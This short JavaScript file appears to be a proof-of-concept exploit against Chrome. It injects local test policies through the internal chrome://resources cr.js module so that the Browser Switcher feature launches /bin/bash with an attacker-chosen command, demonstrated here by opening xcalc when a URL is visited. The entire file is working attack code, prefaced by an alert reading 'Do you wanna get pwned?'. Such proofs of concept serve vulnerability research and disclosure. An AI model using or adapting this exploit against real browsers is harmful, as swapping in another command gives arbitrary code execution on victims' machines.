alert("Do you wanna get pwned?");
async function aa() {


    let cr = await import('chrome://resources/js/cr.js');
    let policy = JSON.stringify([
        { 
            name: "BrowserSwitcherEnabled",
            value: true,
            level: 1,
            source: 1,
            scope: 1
        },
        {
            name: "BrowserSwitcherUrlList",
            value: ["example.com"],
            level: 1,
            source: 1,
            scope: 1
        },
        { 
            name: "AlternativeBrowserPath",
            value: "/bin/bash",
            level: 1,
            source: 1,
            scope: 1
        },
        { 
            name: "AlternativeBrowserParameters",
            value: ["-c", "xcalc # https://example.com"],
            level: 1,
            source: 1,
            scope: 1
        }
    ]);

    await cr.sendWithPromise("setLocalTestPolicies", policy, "");
    window.open("https://example.com")

}

aa().catch(console.error);
